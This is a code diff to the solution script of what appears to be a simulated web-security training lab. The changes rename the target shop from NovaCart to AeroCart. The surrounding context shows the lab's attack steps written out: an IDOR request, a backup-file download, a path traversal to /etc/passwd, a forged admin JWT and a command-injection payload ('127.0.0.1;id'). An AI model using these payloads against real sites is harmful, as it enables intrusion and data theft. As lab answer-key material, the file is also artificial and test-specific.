@@ -41,13 +41,13 @@ export const solve = {
     // V-IDOR: read another customer's order
     l.nav('/api/order?id=5001');
     // V-FILE: sensitive file exposure
-    l.nav('/download?file=backups/novacart-db.sql.bak');
+    l.nav('/download?file=backups/aerocart-db.sql.bak');
     // V-TRAVERSAL: path traversal
     l.nav('/download?file=../../../../etc/passwd');
     // V-JWT: forge an admin token with the (leaked) weak secret, set it, enter admin
     const secret = l.state.target.jwtSecret;
     const token = l.term(`jwt sign ${secret} {"user":"admin","role":"admin"}`).result.output.trim();
-    l.ok('browser.setCookie', { name: 'nc_admin', value: token });
+    l.ok('browser.setCookie', { name: 'ac_admin', value: token });
     l.nav('/admin');
     // V-CMD: command injection in the admin host check
     l.nav('/admin/ping?host=127.0.0.1;id');
@@ -68,7 +68,7 @@ export const solve = {
     }
   },
   report(l: Lab) {
-    l.ok('report.submit', { summary: 'NovaCart exposes nine exploitable web vulnerabilities spanning injection, broken access control, authentication and SSRF. All were confirmed, remediated and verified during this engagement.' });
+    l.ok('report.submit', { summary: 'AeroCart exposes nine exploitable web vulnerabilities spanning injection, broken access control, authentication and SSRF. All were confirmed, remediated and verified during this engagement.' });
   },
   all(l: Lab) { solve.recon(l); solve.exploit(l); solve.document(l); solve.remediate(l); solve.report(l); },
 };
